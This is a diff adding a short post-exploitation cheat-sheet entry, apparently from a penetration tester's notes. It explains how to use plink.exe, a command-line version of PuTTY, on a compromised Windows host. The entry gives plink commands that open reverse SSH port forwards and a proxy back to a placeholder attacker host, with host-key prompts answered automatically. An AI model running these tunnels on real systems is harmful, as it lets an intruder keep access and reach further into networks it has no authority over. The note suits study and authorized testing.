@@ -1,0 +1,15 @@
+- plink.exe
+    - description : it is a cli version of putty
+    - use case : copy the binary to a compromized server and use to create a reverse connexion
+    - prerequesite : 
+        - generate a private key with ssh-keygen
+        - generate an appropriate private key using the fresh private key : 
+            - command : puttygen PRIV_KEY -o PRIV_KEY.ppk
+    - syntax : 
+        - port forwarding
+            - command : cmd.exe /c echo y | .\plink.exe -R ATTACKER_PORT:TARGET_IP:TARGET_PORT ATTACKER_USERNAME@ATTACKING_IP -i PRIV_KEY -N
+        - proxy : 
+            - command : cmd.exe /c echo y | .\plink.exe -R ATTACKER_PORT ATTACKER_USERNAME@ATTACKING_IP -i KEYFILE -N
+    - source : 
+        - kali : /usr/share/windows-resources/binaries/plink.exe
+        - remote : https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
